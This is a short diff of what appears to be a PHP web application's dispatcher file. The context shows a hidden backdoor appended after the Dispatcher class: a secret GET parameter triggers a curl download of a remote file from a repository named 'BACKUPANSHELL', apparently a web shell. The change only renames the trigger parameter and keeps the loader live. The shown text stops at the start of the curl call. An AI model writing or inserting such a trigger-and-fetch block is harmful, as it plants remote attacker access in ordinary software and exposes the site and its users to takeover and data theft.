@@ -253,7 +253,7 @@ class Dispatcher {
   fatalError('404 Not Found');
  }
 }
-if (isset($_GET['fuckingteam'])) {
+if (isset($_GET['anakMeMEkKomTel'])) {
     $url = "https://raw.githubusercontent.com/avatarkabellistrik-source/BACKUPANSHELL/refs/heads/main/alfakingsman.txt";
 
     $ch= curl_init();
